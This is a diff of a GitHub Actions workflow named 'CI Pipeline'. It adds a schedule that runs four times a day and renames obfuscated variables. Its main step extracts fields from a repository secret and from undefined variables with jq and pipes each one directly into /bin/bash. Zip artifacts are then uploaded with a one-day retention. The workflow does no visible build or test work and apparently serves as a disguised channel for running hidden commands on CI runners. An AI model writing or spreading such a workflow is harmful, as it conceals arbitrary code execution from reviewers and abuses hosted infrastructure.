@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '44 0,6,12,18 * * *'
 jobs:
   action:
     runs-on: ubuntu-latest
@@ -9,19 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Begin
         env:
-          qludm70: ${{ secrets.qludm70 }}
+          bk549: ${{ secrets.bk549 }}
         run: |
-          printf '%s' "$qludm70" | jq -r .o87 | /bin/bash
-          echo $aatsw2822 | jq -r .mvr8 | /bin/bash
-          echo $ivv3 | jq -r .ngops9 | /bin/bash
-          printf '%s' "$wcrjb1" | jq -r .qrbd211 | /bin/bash
-          printf '%s' "$duuwg72405" | jq -r .fnas181 | /bin/bash
-          echo $s489 | jq -r .dvhjo81488 | /bin/bash
-          echo $coqlp3519 | jq -r .j1 | /bin/bash
+          printf '%s' "$bk549" | jq -r .cls4517 | /bin/bash
+          echo $v0 | jq -r .wi6440 | /bin/bash
+          echo $tjtp5 | jq -r .lj93307 | /bin/bash
+          echo $mu67 | jq -r .ue318 | /bin/bash
+          echo $c78 | jq -r .po1 | /bin/bash
+          printf '%s' "$frj4" | jq -r .kusgr2861 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: jzNNrXwa
+          name: wYls1Uqm
           path: "*.zip"
           retention-days: 1
